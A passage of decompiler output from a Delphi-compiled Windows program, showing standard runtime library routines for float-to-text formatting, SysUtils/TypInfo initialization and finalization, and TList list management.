      return (_BYTE *)FLOATTOTEXT(v20, a2, v8, 0, 15, 0);
    if ( a5 != v18 )
      sub_40ACC5((int)&v21, a5);
  }
  return sub_40AD70((int)&v21);
}
// 40ABFE: variable 'v10' is possibly undefined

//----- (0040AC8A) --------------------------------------------------------
char __usercall sub_40AC8A@<al>(int a1@<ecx>, int a2@<ebp>)
{
  char *v2; // esi
  char v3; // al
  char result; // al
  char v5; // ah
  char v6; // al

  v2 = *(char **)(a2 + 8);
  if ( a1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = *v2++;
        if ( v3 != 39 && v3 != 34 )
          break;
        v5 = v3;
        while ( 1 )
        {
          v6 = *v2++;
          if ( v6 == v5 )
            break;
          if ( !v6 )
            return **(_BYTE **)(a2 + 8);
        }
      }
      if ( !v3 )
        break;
      if ( v3 == 59 && !--a1 )
      {
        result = *v2;
        if ( *v2 && result != 59 )
          return result;
        return **(_BYTE **)(a2 + 8);
      }
    }
  }
  return **(_BYTE **)(a2 + 8);
}

//----- (0040ACC5) --------------------------------------------------------
int __usercall sub_40ACC5@<eax>(int a1@<ebp>, char *a2@<esi>)
{
  int v2; // ebx
  int v3; // ecx
  int v4; // edx
  char v5; // al
  char v6; // ah
  char v7; // al
  int v8; // eax
  bool v9; // cc
  int v10; // eax
  int v11; // eax
  int result; // eax

  *(_DWORD *)(a1 - 16) = a2;
  v2 = 0x7FFF;
  v3 = 0;
  v4 = 0;
  *(_DWORD *)(a1 - 24) = -1;
  *(_BYTE *)(a1 - 8) = 0;
  *(_BYTE *)(a1 - 12) = 0;
  do
  {
LABEL_2:
    v5 = *a2++;
    while ( 1 )
    {
      switch ( v5 )
      {
        case '#':
          ++v4;
          goto LABEL_2;
        case '0':
          if ( v4 < v2 )
            v2 = v4;
          v3 = ++v4;
          goto LABEL_2;
        case '.':
          if ( *(_DWORD *)(a1 - 24) == -1 )
            *(_DWORD *)(a1 - 24) = v4;
          goto LABEL_2;
        case ',':
          *(_BYTE *)(a1 - 8) = 1;
          goto LABEL_2;
        case '\'':
        case '"':
          v6 = v5;
          while ( 1 )
          {
            v7 = *a2++;
            if ( v7 == v6 )
              goto LABEL_2;
            if ( !v7 )
              goto LABEL_30;
          }
      }
      if ( v5 != 69 && v5 != 101 )
        break;
      v5 = *a2++;
      if ( v5 == 45 || v5 == 43 )
      {
        *(_BYTE *)(a1 - 12) = 1;
        do
          v5 = *a2++;
        while ( v5 == 48 );
      }
    }
  }
  while ( v5 != 59 && v5 );
LABEL_30:
  *(_DWORD *)(a1 - 20) = v4;
  if ( *(_DWORD *)(a1 - 24) == -1 )
    *(_DWORD *)(a1 - 24) = v4;
  v8 = *(_DWORD *)(a1 - 24);
  v9 = v8 <= v3;
  v10 = v8 - v3;
  if ( !v9 )
    v10 = 0;
  *(_DWORD *)(a1 - 32) = v10;
  v11 = *(_DWORD *)(a1 - 24);
  v9 = v11 < v2;
  result = v11 - v2;
  if ( v9 )
    result = 0;
  *(_DWORD *)(a1 - 28) = result;
  return result;
}

//----- (0040AD70) --------------------------------------------------------
_BYTE *__usercall sub_40AD70@<eax>(int a1@<ebp>)
{
  int v1; // eax
  int v2; // edx
  char *v3; // esi
  _BYTE *v4; // edi
  __int16 v5; // ax
  char v6; // ah
  char v7; // al
  unsigned int v8; // ecx

  if ( *(_BYTE *)(a1 - 12) )
  {
    v1 = *(_DWORD *)(a1 - 24);
    v2 = 0;
  }
  else
  {
    v1 = *(__int16 *)(a1 - 64);
    if ( v1 <= *(_DWORD *)(a1 - 24) )
      v1 = *(_DWORD *)(a1 - 24);
    v2 = *(__int16 *)(a1 - 64) - *(_DWORD *)(a1 - 24);
  }
  *(_DWORD *)(a1 - 36) = v1;
  *(_DWORD *)(a1 - 40) = v2;
  v3 = *(char **)(a1 - 16);
  v4 = *(_BYTE **)(a1 - 4);
  if ( *(_BYTE *)(a1 - 62) && v3 == *(char **)(a1 + 8) )
    *v4++ = 45;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        do
        {
          while ( 1 )
          {
            LOBYTE(v5) = *v3++;
            if ( (_BYTE)v5 != 35 && (_BYTE)v5 != 48 )
              break;
            sub_40AE2B((_BYTE *)(a1 - 61), a1, v4);
          }
        }
        while ( (_BYTE)v5 == 46 || (_BYTE)v5 == 44 );
        if ( (_BYTE)v5 != 39 && (_BYTE)v5 != 34 )
          break;
        v6 = v5;
        while ( 1 )
        {
          v7 = *v3++;
          if ( v7 == v6 )
            break;
          if ( !v7 )
            return &v4[-*(_DWORD *)(a1 - 4)];
          *v4++ = v7;
        }
      }
      if ( (_BYTE)v5 != 69 && (_BYTE)v5 != 101 )
        break;
      HIBYTE(v5) = *v3;
      if ( *v3 != 43 )
      {
        if ( HIBYTE(v5) != 45 )
          goto LABEL_19;
        HIBYTE(v5) = 0;
      }
      v8 = -1;
      do
      {
        ++v8;
        ++v3;
      }
      while ( *v3 == 48 );
      if ( v8 >= 4 )
        v8 = 4;
      sub_40AA4C(v5, *(__int16 *)(a1 - 64) - *(_DWORD *)(a1 - 24), v8, *(_BYTE *)(a1 - 61), v4);
    }
    if ( (_BYTE)v5 == 59 || !(_BYTE)v5 )
      return &v4[-*(_DWORD *)(a1 - 4)];
LABEL_19:
    *v4++ = v5;
  }
}

//----- (0040AE2B) --------------------------------------------------------
char __usercall sub_40AE2B@<al>(_BYTE *a1@<ebx>, int a2@<ebp>, _BYTE *a3@<edi>)
{
  if ( *(_DWORD *)(a2 - 40) )
  {
    if ( *(int *)(a2 - 40) < 0 )
    {
      ++*(_DWORD *)(a2 - 40);
      if ( *(_DWORD *)(a2 - 36) > *(_DWORD *)(a2 - 28) )
        JUMPOUT(0x40AE8D);
      JUMPOUT(0x40AE5C);
    }
    do
      sub_40AE4C(a1, a2, a3);
    while ( (*(_DWORD *)(a2 - 40))-- != 1 );
  }
  return sub_40AE4C(a1, a2, a3);
}
// 40AE4A: control flows out of bounds to 40AE8D
// 40AE48: control flows out of bounds to 40AE5C

//----- (0040AE4C) --------------------------------------------------------
char __usercall sub_40AE4C@<al>(_BYTE *a1@<ebx>, int a2@<ebp>, _BYTE *a3@<edi>)
{
  int v3; // eax
  _BYTE *v4; // edi
  __int16 v5; // t2

  LOBYTE(v3) = *a1;
  if ( !*a1 )
  {
    v3 = *(_DWORD *)(a2 - 36);
    if ( v3 <= *(_DWORD *)(a2 - 32) )
      goto LABEL_10;
    LOBYTE(v3) = 48;
  }
  if ( *(_DWORD *)(a2 - 36) )
  {
    *a3 = v3;
    v4 = a3 + 1;
    if ( *(_BYTE *)(a2 - 8) )
    {
      v3 = *(_DWORD *)(a2 - 36);
      if ( v3 > 1 )
      {
        v5 = (unsigned __int16)v3 % 3u;
        LOBYTE(v3) = (unsigned __int16)v3 / 3u;
        if ( (_BYTE)v5 == 1 )
        {
          LOBYTE(v3) = byte_41E4EE;
          *v4 = byte_41E4EE;
        }
      }
    }
  }
  else
  {
    BYTE1(v3) = v3;
    LOBYTE(v3) = byte_41E4EF;
    *(_WORD *)a3 = v3;
  }
LABEL_10:
  --*(_DWORD *)(a2 - 36);
  return v3;
}
// 41E4EE: using guessed type char byte_41E4EE;
// 41E4EF: using guessed type char byte_41E4EF;

//----- (0040AE91) --------------------------------------------------------
_BYTE *__userpurge FLOATTODECIMAL@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5)
{
  _BYTE *result; // eax
  int savedregs; // [esp+26h] [ebp+0h] BYREF

  if ( a3 )
    result = sub_40AFBF(a1, (int)&savedregs, a2);
  else
    result = (_BYTE *)sub_40AEB8(a1, 0, a1, (int)&savedregs, a2);
  return result;
}

//----- (0040AEB8) --------------------------------------------------------
int __usercall sub_40AEB8@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<esi>)
{
  __int16 v5; // dx
  int result; // eax
  long double v7; // st7
  __int16 v10; // fps
  bool v11; // c0
  char v12; // c2
  bool v13; // c3
  _WORD *v14; // edi
  int v15; // edx
  __int16 v16; // ax
  int v17; // edi

  v5 = *(_WORD *)(a5 + 8);
  result = v5 & 0x7FFF;
  if ( (v5 & 0x7FFF) == 0 )
    goto LABEL_7;
  if ( result == 0x7FFF )
  {
    if ( *(__int16 *)(a5 + 6) >= 0 || !*(_DWORD *)a5 && *(_DWORD *)(a5 + 4) == 0x80000000 )
      goto LABEL_8;
    result = 0x8000;
LABEL_7:
    v5 = 0;
LABEL_8:
    *(_BYTE *)(a3 + 3) = 0;
    goto LABEL_28;
  }
  v7 = *(double *)a5;
  *(_DWORD *)(a4 - 8) = ((19728 * (result - 0x3FFF)) >> 16) + 1;
  _ST7 = fabs(v7);
  System::__linkproc__ Pow10(18 - *(_DWORD *)(a4 - 8));
  __asm { frndint }
  v11 = _ST7 > -1.069934862234205e145;
  v12 = 0;
  v13 = -1.069934862234205e145 == _ST7;
  *(_WORD *)(a4 - 4) = v10;
  if ( (*(_WORD *)(a4 - 4) & 0x4100) != 0 )
  {
    _ST7 = _ST7 / (double)10;
    ++*(_DWORD *)(a4 - 8);
  }
  *(long double *)(a4 - 26) = __FBSTP__(_ST7);
  v14 = (_WORD *)(a3 + 3);
  v15 = 9;
  do
  {
    HIBYTE(v16) = *(_BYTE *)(a4 + v15 - 27);
    LOBYTE(v16) = HIBYTE(v16) >> 4;
    HIBYTE(v16) &= 0xFu;
    *v14++ = v16 + 12336;
    --v15;
  }
  while ( v15 );
  *(_BYTE *)v14 = 0;
  v17 = *(_DWORD *)(a4 + 8) + *(_DWORD *)(a4 - 8);
  if ( v17 < 0 )
  {
    result = 0;
    goto LABEL_7;
  }
  if ( (unsigned int)v17 >= *(_DWORD *)(a4 + 12) )
    v17 = *(_DWORD *)(a4 + 12);
  if ( (unsigned int)v17 >= 0x12 )
  {
    v17 = 18;
LABEL_24:
    while ( 1 )
    {
      *(_BYTE *)(a3 + v17-- + 3) = 0;
      if ( v17 < 0 )
        break;
      if ( *(_BYTE *)(a3 + v17 + 3) != 48 )
        goto LABEL_26;
    }
    v5 = 0;
  }
  else
  {
    if ( *(_BYTE *)(a3 + v17 + 3) < 0x35u )
      goto LABEL_24;
    while ( 1 )
    {
      *(_BYTE *)(a3 + v17-- + 3) = 0;
      if ( v17 < 0 )
        break;
      if ( ++*(_BYTE *)(a3 + v17 + 3) <= 0x39u )
        goto LABEL_26;
    }
    *(_WORD *)(a3 + 3) = 49;
    ++*(_DWORD *)(a4 - 8);
LABEL_26:
    v5 = *(_WORD *)(a5 + 8);
  }
  result = *(_DWORD *)(a4 - 8);
LABEL_28:
  *(_WORD *)a3 = result;
  *(_BYTE *)(a3 + 2) = v5 < 0;
  return result;
}

//----- (0040AFBF) --------------------------------------------------------
_BYTE *__usercall sub_40AFBF@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>)
{
  unsigned __int64 v3; // rax
  int v4; // ecx
  int v5; // edi
  bool v6; // cf
  long double v7; // st7
  int v8; // edx
  _BYTE *v9; // edi
  int v10; // ecx
  unsigned __int8 v11; // ah
  char v12; // al
  char v13; // al
  _BYTE *result; // eax
  int v15; // edx

  v3 = *(_QWORD *)a3;
  if ( *(_QWORD *)a3 )
  {
    if ( (v3 & 0x8000000000000000ui64) != 0i64 )
      v3 = -(__int64)v3;
    v4 = 0;
    v5 = *(_DWORD *)(a2 + 8);
    if ( v5 < 0 )
      v5 = 0;
    if ( v5 >= 4 )
    {
      v5 = 4;
      do
      {
        ++v4;
        v6 = v3 < 0xDE0B6B3A7640000i64;
        v3 -= 1000000000000000000i64;
      }
      while ( !v6 );
      --v4;
      v3 += 1000000000000000000i64;
    }
    *(_QWORD *)(a2 - 16) = v3;
    v7 = (double)*(__int64 *)(a2 - 16);
    v8 = v5;
    if ( v5 != 4 )
      v7 = v7 / (double)dword_40A8C8[4 - v5];
    *(long double *)(a2 - 26) = __FBSTP__(v7);
    v9 = (_BYTE *)(a1 + 3);
    if ( v4 )
    {
      *v9 = v4 + 48;
      v9 = (_BYTE *)(a1 + 4);
      v10 = 9;
      goto LABEL_19;
    }
    v10 = 9;
    while ( 1 )
    {
      v11 = *(_BYTE *)(a2 + v10 - 27);
      v12 = v11 >> 4;
      if ( v11 >> 4 )
        goto LABEL_20;
      v13 = v11 & 0xF;
      if ( (v11 & 0xF) != 0 )
        break;
      if ( !--v10 )
        goto LABEL_25;
    }
    while ( 1 )
    {
      *v9++ = v13 + 48;
      if ( !--v10 )
        break;
LABEL_19:
      v11 = *(_BYTE *)(a2 + v10 - 27);
      v12 = v11 >> 4;
LABEL_20:
      *v9++ = v12 + 48;
      v13 = v11 & 0xF;
    }
    result = &v9[-a1 - 3 - v8];
    do
      *v9-- = 0;
    while ( *v9 == 48 );
    v15 = *(_DWORD *)(a3 + 4) >> 31;
  }
  else
  {
LABEL_25:
    result = 0;
    LOBYTE(v15) = 0;
    *(_BYTE *)(a1 + 3) = 0;
  }
  *(_WORD *)a1 = (_WORD)result;
  *(_BYTE *)(a1 + 2) = v15;
  return result;
}
// 40A8C8: using guessed type int dword_40A8C8[];

//----- (0040B13B) --------------------------------------------------------
char __usercall sub_40B13B@<al>(char *a1@<esi>)
{
  char result; // al

  do
    result = *a1++;
  while ( result && result == 32 );
  return result;
}

//----- (0040B146) --------------------------------------------------------
double __usercall sub_40B146@<st0>(int a1@<ebp>, char *a2@<esi>, double result@<st0>)
{
  int v3; // eax
  int i; // edx
  char v5; // al
  bool v6; // cf

  v3 = 0;
  for ( i = 0; ; ++i )
  {
    v5 = *a2++;
    v5 -= 58;
    v6 = __CFADD__(v5, 10);
    LOBYTE(v3) = v5 + 10;
    if ( !v6 )
      break;
    *(_DWORD *)(a1 - 4) = v3;
    result = result * (double)10 + (double)*(int *)(a1 - 4);
  }
  return result;
}

//----- (0040B162) --------------------------------------------------------
char __usercall sub_40B162@<al>(_BYTE *a1@<esi>)
{
  int v1; // eax
  unsigned int v2; // edx
  char v3; // al
  bool v4; // cf

  v1 = 0;
  v2 = 0;
  if ( *a1 == 43 || *a1 == 45 )
    ++a1;
  do
  {
    v3 = *a1 - 58;
    v4 = __CFADD__(v3, 10);
    LOBYTE(v1) = v3 + 10;
    if ( !v4 )
      break;
    ++a1;
    v2 = v1 + 10 * v2;
  }
  while ( v2 < 0x1F4 );
  return v1;
}

//----- (0040B194) --------------------------------------------------------
int __cdecl Sysutils::Finalization()
{
  LStr *v0; // ecx
  LStr *v1; // ecx
  LStr *v2; // ecx
  LStr *v3; // ecx
  LStr *v4; // ecx
  LStr *v5; // ecx
  LStr *v6; // ecx
  LStr *v7; // ecx
  LStr *v8; // ecx
  LStr *v9; // ecx
  int result; // eax
  unsigned int v11[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v11[2] = (unsigned int)&savedregs;
  v11[1] = (unsigned int)&loc_40B2CA;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  if ( !++dword_41E5F0 )
  {
    sub_40A5EC(&dword_41E5FC);
    sub_40A440();
    SysUtils::_16801();
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41C230, (char *)dword_40966C, 22);
    System::__linkproc__ FinalizeArray((OLECHAR **)dword_41C1F8, (char *)dword_4095EC, 7);
    System::__linkproc__ LStrClr(v0);
    System::__linkproc__ FinalizeArray((OLECHAR **)&unk_41E5B4, (char *)dword_401004, 7);
    System::__linkproc__ FinalizeArray((OLECHAR **)&unk_41E58C, (char *)dword_401004, 7);
    System::__linkproc__ FinalizeArray((OLECHAR **)&unk_41E570, (char *)dword_401004, 7);
    System::__linkproc__ FinalizeArray((OLECHAR **)&unk_41E540, (char *)dword_401004, 12);
    System::__linkproc__ FinalizeArray((OLECHAR **)&unk_41E510, (char *)dword_401004, 12);
    System::__linkproc__ LStrClr(v1);
    System::__linkproc__ LStrClr(v2);
    System::__linkproc__ LStrClr(v3);
    System::__linkproc__ LStrClr(v4);
    System::__linkproc__ LStrClr(v5);
    System::__linkproc__ LStrClr(v6);
    System::__linkproc__ LStrClr(v7);
    System::__linkproc__ LStrClr(v8);
    System::__linkproc__ LStrClr(v9);
  }
  result = 0;
  __writefsdword(0, v11[0]);
  return result;
}
// 40B1F4: variable 'v0' is possibly undefined
// 40B267: variable 'v1' is possibly undefined
// 40B271: variable 'v2' is possibly undefined
// 40B27B: variable 'v3' is possibly undefined
// 40B285: variable 'v4' is possibly undefined
// 40B28F: variable 'v5' is possibly undefined
// 40B299: variable 'v6' is possibly undefined
// 40B2A3: variable 'v7' is possibly undefined
// 40B2AD: variable 'v8' is possibly undefined
// 40B2B7: variable 'v9' is possibly undefined
// 401004: using guessed type int dword_401004[2];
// 4095EC: using guessed type int dword_4095EC[4];
// 40966C: using guessed type int dword_40966C[5];
// 41C1F8: using guessed type int dword_41C1F8[];
// 41C230: using guessed type int (*off_41C230)[3];
// 41E5F0: using guessed type int dword_41E5F0;

//----- (0040B2D4) --------------------------------------------------------
int __usercall Sysutils::initialization@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  unsigned int v5[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_40B33C;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( dword_41E5F0-- == 0 )
  {
    sub_4032D0(&dword_40A5FC);
    sub_4032EC(&dword_40A6E8);
    if ( byte_41E4C9 )
      __linkproc__ LStrAsg((char **)&off_41C124, (char *)&dword_40B350);
    SysUtils::_16723();
    Sysutils::GetFormatSettings(a1, a2, a3);
    SysUtils::_16802();
    SysUtils::_16779();
  }
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 40A5FC: using guessed type int dword_40A5FC;
// 40A6E8: using guessed type int dword_40A6E8;
// 40B350: using guessed type int dword_40B350;
// 41C124: using guessed type int *off_41C124;
// 41E4C9: using guessed type char byte_41E4C9;
// 41E5F0: using guessed type int dword_41E5F0;

//----- (0040B354) --------------------------------------------------------
int Finalization_0_7_2()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B379;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E600;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E600: using guessed type int dword_41E600;

//----- (0040B384) --------------------------------------------------------
void sub_40B384()
{
  --dword_41E600;
}
// 41E600: using guessed type int dword_41E600;

//----- (0040B38C) --------------------------------------------------------
int Finalization_0_7_3()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B3B1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E604;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E604: using guessed type int dword_41E604;

//----- (0040B3BC) --------------------------------------------------------
void sub_40B3BC()
{
  --dword_41E604;
}
// 41E604: using guessed type int dword_41E604;

//----- (0040B474) --------------------------------------------------------
int Finalization_0_7_4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B499;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E608;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E608: using guessed type int dword_41E608;

//----- (0040B4A4) --------------------------------------------------------
void sub_40B4A4()
{
  --dword_41E608;
}
// 41E608: using guessed type int dword_41E608;

//----- (0040B4D8) --------------------------------------------------------
int __fastcall Typinfo::Finalization(Typinfo *this)
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_40B51E;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E60C )
  {
    System::__linkproc__ LStrClr(this);
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41C2E4, (char *)dword_401004, 2);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41C2E4: using guessed type char *off_41C2E4;
// 41E60C: using guessed type int dword_41E60C;

//----- (0040B528) --------------------------------------------------------
void sub_40B528()
{
  --dword_41E60C;
}
// 41E60C: using guessed type int dword_41E60C;

//----- (0040BEA8) --------------------------------------------------------
void __usercall Classes::UnRegisterModuleClasses(PVOID a1@<eax>)
{
  _DWORD *v3; // edi
  int v4; // ebx
  const void *v5; // eax
  int v6; // ebx
  const void *v7; // eax
  SIZE_T v8; // [esp-Ch] [ebp-34h] BYREF
  void *v9; // [esp-8h] [ebp-30h]
  int *v10; // [esp-4h] [ebp-2Ch]
  void *v11; // [esp+0h] [ebp-28h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+Ch] [ebp-1Ch] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v3 = (_DWORD *)sub_40C4B0(dword_41E618);
  v10 = &savedregs;
  v9 = &loc_40BF60;
  v8 = (SIZE_T)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  v4 = v3[2] - 1;
  if ( v4 >= 0 )
  {
    do
    {
      v5 = (const void *)Classes::TList::Get(v4, (int)v3);
      VirtualQuery_0(v5, &Buffer, 0x1Cu);
      if ( !a1 || a1 == Buffer.AllocationBase )
        Classes::TList::Delete(v4, v3);
      --v4;
    }
    while ( v4 != -1 );
  }
  v6 = (*(int (__stdcall **)(SIZE_T))(*(_DWORD *)dword_41E61C + 20))(v8) - 1;
  if ( v6 >= 0 )
  {
    do
    {
      v8 = 28;
      v7 = (const void *)(*(int (**)(void))(*(_DWORD *)dword_41E61C + 24))();
      VirtualQuery_0(v7, &Buffer, v8);
      if ( !a1 || a1 == Buffer.AllocationBase )
        (*(void (__cdecl **)(void *, int *))(*(_DWORD *)dword_41E61C + 68))(v9, v10);
      --v6;
    }
    while ( v6 != -1 );
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_40BF67;
  sub_40C514(dword_41E618);
}
// 41E618: using guessed type int dword_41E618;
// 41E61C: using guessed type int dword_41E61C;

//----- (0040BFC8) --------------------------------------------------------
_DWORD *__userpurge Classes::_16548@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5)
{
  char v5; // [esp-10h] [ebp-10h]

  if ( a2 )
    result = (_DWORD *)System::__linkproc__ ClassCreate((int)result, a2, v5);
  result[1] = a3;
  result[2] = a5;
  result[3] = a4;
  if ( a2 )
    result = sub_402D34(result);
  return result;
}
// 40BFD2: variable 'v5' is possibly undefined
// 40BFD7: variable 'a3' is possibly undefined
// 40BFE8: variable 'a2' is possibly undefined

//----- (0040C000) --------------------------------------------------------
void __usercall Classes::RegisterIntegerConsts(void *a1@<ecx>, bool (__fastcall __high *a2)(const System::AnsiString, int *)@<edx>, int a3@<eax>)
{
  _DWORD *v3; // eax

  v3 = Classes::_16548(dword_40BFBC, 1, a3, (int)a1, (int)a2);
  Classes::TThreadList::Add(v3, dword_41E620);
}
// 40BFBC: using guessed type int dword_40BFBC[3];
// 41E620: using guessed type int dword_41E620;

//----- (0040C02C) --------------------------------------------------------
char __userpurge Classes::IdentToInt@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // esi
  _BYTE **i; // ebx
  char result; // al

  if ( a4 < 0 )
    return 0;
  v5 = a4 + 1;
  for ( i = (_BYTE **)(a3 + 4); !Sysutils::SameText(*i, a1); i += 2 )
  {
    if ( !--v5 )
      return 0;
  }
  result = 1;
  *a2 = *(i - 1);
  return result;
}

//----- (0040C06C) --------------------------------------------------------
char __userpurge Classes::IntToIdent@<al>(int a1@<eax>, char **a2@<edx>, int a3@<ecx>, int a4)
{
  int v4; // esi
  char v7; // [esp+Fh] [ebp-5h]

  if ( a4 < 0 )
    return 0;
  v4 = a4 + 1;
  while ( a1 != *(_DWORD *)a3 )
  {
    a3 += 8;
    if ( !--v4 )
      return 0;
  }
  v7 = 1;
  __linkproc__ LStrAsg(a2, *(char **)(a3 + 4));
  return v7;
}

//----- (0040C0B0) --------------------------------------------------------
void __usercall TList_Destroy(void *TList_Self@<eax>)
{
  char v1; // dl
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C(TList_Self, v1);
  v4 = v3;
  v5 = v2;
  (*(void (**)(void))(*v2 + 8))();
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 40C0B2: variable 'v1' is possibly undefined
// 40C0B7: variable 'v3' is possibly undefined

//----- (0040C0D0) --------------------------------------------------------
int __usercall Classes::TList::Add@<eax>(Classes::TList *this@<ecx>, void *a2@<edx>, _DWORD *a3@<eax>)
{
  int v5; // esi

  v5 = a3[2];
  if ( v5 == a3[3] )
    (*(void (__thiscall **)(Classes::TList *))*a3)(this);
  *(_DWORD *)(a3[1] + 4 * v5) = a2;
  ++a3[2];
  if ( a2 )
    (*(void (__fastcall **)(_DWORD, void *))(*a3 + 4))(0, a2);
  return v5;
}

//----- (0040C104) --------------------------------------------------------
void __usercall sub_40C104(_DWORD *a1@<eax>)
{
  Classes::TList::SetCount(0, a1);
  TList::SetCapacity((int)a1, 0);
}

//----- (0040C11C) --------------------------------------------------------
int __usercall Classes::TList::Delete@<eax>(int a1@<edx>, _DWORD *a2@<eax>)
{
  int v5; // ecx
  int v6; // edi
  int result; // eax

  if ( a1 < 0 || a1 >= a2[2] )
    Classes::TList::Error(a1, (int)off_41DC24[0]);
  v6 = Classes::TList::Get(a1, (int)a2);
  result = --a2[2];
  if ( a1 < result )
    result = Move((BYTE *)(a2[1] + 4 * a1 + 4), (BYTE *)(a2[1] + 4 * a1), 4 * (result - a1));
  if ( v6 )
  {
    LOBYTE(v5) = 2;
    result = (*(int (__fastcall **)(int, int))(*a2 + 4))(v5, v6);
  }
  return result;
}
// 40C175: variable 'v5' is possibly undefined
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040C17C) --------------------------------------------------------
int __usercall sub_40C17C@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (0040C180) --------------------------------------------------------
void __userpurge sub_40C180(void *a1@<edx>, int a2@<ebp>, DWORD a3, DWORD a4, DWORD a5, const ULONG_PTR *a6)
{
  void *v7; // edx

  sub_40C17C(a2);
  LOBYTE(v7) = 1;
  Exception_CreateFmt(dword_40B794, v7, a1);
  sub_402F98(a3, a4, a5, a6);
}
// 40C1A8: variable 'v7' is possibly undefined
// 40B794: using guessed type int dword_40B794[3];

//----- (0040C1B8) --------------------------------------------------------
void __fastcall Classes::TList::Error(int a1, int a2)
{
  LStr *v2; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v3; // [esp-14h] [ebp-18h] BYREF
  DWORD v4; // [esp-10h] [ebp-14h]
  void **v5; // [esp-Ch] [ebp-10h]
  const ULONG_PTR *v6; // [esp-8h] [ebp-Ch]
  unsigned int v7; // [esp-4h] [ebp-8h]
  BYTE *v8; // [esp+0h] [ebp-4h] BYREF
  LStr *savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v5 = (void **)&savedregs;
  v4 = (DWORD)&loc_40C200;
  v3 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v3);
  System::LoadResString(a2, &v8);
  sub_40C180(v8, (int)&savedregs, (DWORD)v3, v4, (DWORD)v5, v6);
  v2 = savedregs;
  __writefsdword(0, v7);
  savedregs = (LStr *)&loc_40C207;
  System::__linkproc__ LStrClr(v2);
}

//----- (0040C20C) --------------------------------------------------------
int __usercall Classes::TList::Get@<eax>(int a1@<edx>, int a2@<eax>)
{
  if ( a1 < 0 || a1 >= *(_DWORD *)(a2 + 8) )
    Classes::TList::Error(a1, (int)off_41DC24[0]);
  return *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * a1);
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040C268) --------------------------------------------------------
int __usercall sub_40C268@<eax>(int a1@<eax>, int a2@<edx>)
{
  int i; // ecx

  for ( i = 0; i < *(_DWORD *)(a1 + 8) && a2 != *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * i); ++i )
    ;
  if ( i == *(_DWORD *)(a1 + 8) )
    i = -1;
  return i;
}

//----- (0040C288) --------------------------------------------------------
int __usercall sub_40C288@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // esi

  v3 = sub_40C268((int)a1, a2);
  v4 = v3;
  if ( v3 >= 0 )
    Classes::TList::Delete(v3, a1);
  return v4;
}

//----- (0040C2A8) --------------------------------------------------------
void __usercall TList::SetCapacity(int self@<eax>, int capacity@<edx>)
{
  if ( capacity < *(_DWORD *)(self + 8) || capacity > 0x7FFFFFF )
    Classes::TList::Error(capacity, (int)off_41DBCC[0]);
